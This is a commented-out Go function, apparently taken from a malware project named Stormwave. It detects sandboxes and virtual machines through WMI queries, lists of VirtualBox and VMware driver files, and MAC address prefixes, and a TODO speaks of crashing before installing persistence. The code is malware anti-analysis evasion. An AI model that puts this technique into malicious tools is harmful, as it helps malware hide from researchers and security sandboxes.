//https://github.com/thegostisdead/Stormwave/blob/main/malware/stormwave/sandbox.go
/*
func isEnvSandbox() bool {

	evadeSystemMemory()
	getScreenResolution()

	output := ExecPowershell("Get-WmiObject Win32_ComputerSystem")
	if strings.Contains(output, "VIRTUAL") || strings.Contains(output, "vmware") || strings.Contains(output, "QEMU") {
		fmt.Println("Warning virtual machine founded !")
		//return true
	}

	output = ExecPowershell("Get-WmiObject Win32_VideoController")
	if strings.Contains(output, "VMware") || strings.Contains(output, "VBox") || strings.Contains(output, "QEMU") {
		fmt.Println("Warning virtual machine founded !")
		//return true
	}

	systemFiles := [...]string{
		"C:\\Windows\\system32\\drivers\\BoxMouse.sys",
		"C:\\Windows\\system32\\drivers\\BoxGuest.sys",
		"C:\\Windows\\system32\\drivers\\BoxSF.sys",
		"c:\\windows\\system32\\drivers\\BoxVideo.sys",
		"c:\\windows\\system32\\boxdisp.dll",
		"c:\\windows\\system32\\boxhook.dll",
		"c:\\windows\\system32\\boxmrxnp.dll",
		"c:\\windows\\system32\\vboxogl.dll",
		"c:\\windows\\system32\\vboxoglarrayspu.dll",
		"c:\\windows\\system32\\vboxoglcrutil.dll",
		"c:\\windows\\system32\\vboxoglerrorspu.dll",
		"c:\\windows\\system32\\vboxoglfeedbackspu.dll",
		"c:\\windows\\system32\\vboxoglpackspu.dll",
		"c:\\windows\\system32\\vboxoglpassthroughspu.dll",
		"c:\\windows\\system32\\vboxservice.exe",
		"c:\\windows\\system32\\vboxtray.exe",
		"c:\\windows\\system32\\VBoxControl.exe",
		"c:\\windows\\system32\\drivers\\vmmouse.sys",
		"c:\\windows\\system32\\drivers\\vmhgfs.sys",
		"c:\\windows\\system32\\drivers\\vm3dmp.sys",
		"c:\\windows\\system32\\drivers\\vmci.sys",
		"c:\\windows\\system32\\drivers\\vmhgfs.sys",
		"c:\\windows\\system32\\drivers\\vmmemctl.sys",
		"c:\\windows\\system32\\drivers\\vmmouse.sys",
		"c:\\windows\\system32\\drivers\\vmrawdsk.sys",
		"c:\\windows\\system32\\drivers\\vmusbmouse.sys",
	}
	macAddressPrefix := [...]string{
		"08:00:27", //  (VBOX)
		"00:05:69", //  (VMWARE)
		"00:0C:29", //  (VMWARE)
		"00:1C:14", //  (VMWARE)
		"00:50:56", //  (VMWARE)
		"00:1C:42", //  (Parallels)
		"00:16:3E", //  (Xen)
		"0A:00:27", //  (Hybrid Analysis)
	}

	// search for system files
	for _, element := range systemFiles {

		exists, err := Exists(element)
		if err != nil {
			fmt.Println("Error during file exist")
		}

		if exists {
			fmt.Print("Warning file exist : ")
			fmt.Println(element)
		}
	}

	// check for mac address can detect VM
	macAddress := getMacAddr()
	for _, basePrefix := range macAddressPrefix {
		for _, foundedMac := range macAddress {
			if strings.HasPrefix(foundedMac, basePrefix) {
				fmt.Println("Warning sus mac address founded!")
				// TODO crash the program before install persistence
			}
		}
	}

	return false
}
*/